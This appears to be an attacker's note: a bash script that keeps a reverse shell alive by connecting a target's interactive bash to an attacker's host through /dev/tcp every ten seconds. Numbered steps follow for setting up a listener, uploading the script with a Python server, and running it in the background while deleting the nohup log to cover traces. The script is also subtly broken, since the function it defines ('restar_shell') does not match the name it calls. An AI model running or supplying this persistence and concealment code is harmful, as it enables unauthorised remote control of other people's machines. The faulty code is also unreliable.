```bash
#!/bin/bash

HOST="${1}"
PORT="${2}"

restar_shell() {
    echo "Restarting reverse shell..."
    bash -i >& "/dev/tcp/${HOST}/${PORT}" 0>&1 &
    # what exits the target comes to our terminal, whats typed from attacker goes to socket
    # final & to run in background
}

while true; do
    restart_shell
    sleep 10
done
```

# Steps
1. PORT 1 : Listener (attacker) + payload executed (target)
2. PORT 2 : python server (attacker) + upload of the script (target)
3. PORT 1 : execute the script infinitely without return `nohup ./script > /dev/null 2>&1 & rm nohup.out` and delete the default creation of log